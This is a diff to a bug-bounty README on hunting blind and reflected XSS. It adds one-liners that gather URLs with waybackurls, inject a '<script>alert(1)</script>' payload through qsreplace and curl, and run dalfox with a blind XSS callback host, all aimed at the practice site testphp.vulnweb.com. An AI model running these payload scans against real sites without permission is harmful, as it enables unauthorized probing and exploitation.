@@ -12,7 +12,7 @@
   5) source .bashrc
 ```
 
-## How to Hunt XSS using Dalfox? 
+## How to Hunt Blind XSS using Dalfox? 
 
 - Use Waybackurls by Tomnomnom to Fetch URLS for Specific Target.
 - Use GF patterns to find Possible XSS Vulnerable Parameters.
@@ -22,6 +22,15 @@
 ```bash
 waybackurls testphp.vulnweb.com | gf xss | sed 's/=.*/=/' | sort -u | tee Possible_xss.txt && cat Possible_xss.txt | dalfox -b blindxss.xss.ht pipe > output.txt
 ```
+## How to Hunt Reflected XSS?
+
+- Use Waybackurls by Tomnomnom to Fetch URLS for Specific Target.
+- Use qsreplace for Accept URLs on stdin, replace all query string values with a user-supplied value, only output each combination of query string parameters once per host and path.
+
+* Steps :
+```bash
+waybackurls testphp.vulnweb.com| grep '=' | qsreplace '"><script>alert(1)</script>' | while read host do ; do curl -s --path-as-is --insecure "$host" | grep -qs "<script>alert(1)</script>" && echo "$host \033[0;31m" Vulnerable;done
+```
 
 ## Tools Download Links:- 
 
@@ -29,9 +38,11 @@ waybackurls testphp.vulnweb.com | gf xss | sed 's/=.*/=/' | sort -u | tee Possib
 * 2:- [Waybackurls](https://github.com/tomnomnom/waybackurls)
 * 3:- [GF](https://github.com/tomnomnom/gf)
 * 4:- [GF Patterns](https://github.com/1ndianl33t/Gf-Patterns)
+* 5:- [qsreplace](https://github.com/tomnomnom/qsreplace)
 
 Find Script here : [QuickXSS](https://github.com/theinfosecguy/QuickXSS)
 
 
 If you have any Questions, Reach out to me via [Twitter](https://twitter.com/g0t_rOoT_)
 ## Twitter : [Fani Malik](https://twitter.com/fanimalikhack)
+## Twitter : [Faizee Asad](https://twitter.com/faizee_asad)
